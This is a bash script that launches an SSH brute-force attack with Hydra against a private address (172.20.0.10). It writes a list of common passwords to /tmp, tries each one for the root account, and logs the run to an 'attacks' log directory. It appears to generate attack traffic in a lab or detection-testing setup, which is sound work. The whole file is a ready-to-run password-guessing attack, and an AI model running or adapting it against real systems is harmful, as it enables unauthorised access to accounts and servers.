#!/bin/bash

TARGET="172.20.0.10"
LOG_FILE="/var/log/attacks/bruteforce.log"

echo "=== SSH Brute Force Attack ===" | tee -a $LOG_FILE
echo "Target: $TARGET" | tee -a $LOG_FILE
echo "Started: $(date)" | tee -a $LOG_FILE
echo "" | tee -a $LOG_FILE

cat > /tmp/passwords.txt << EOF
admin
password
123456
root
webapp
webadmin
admin123
password123
EOF

echo "[*] Starting Hydra SSH brute force..." | tee -a $LOG_FILE
hydra -l root -P /tmp/passwords.txt ssh://$TARGET -t 4 -V 2>&1 | tee -a $LOG_FILE

echo "" | tee -a $LOG_FILE
echo "=== Attack completed: $(date) ===" | tee -a $LOG_FILE
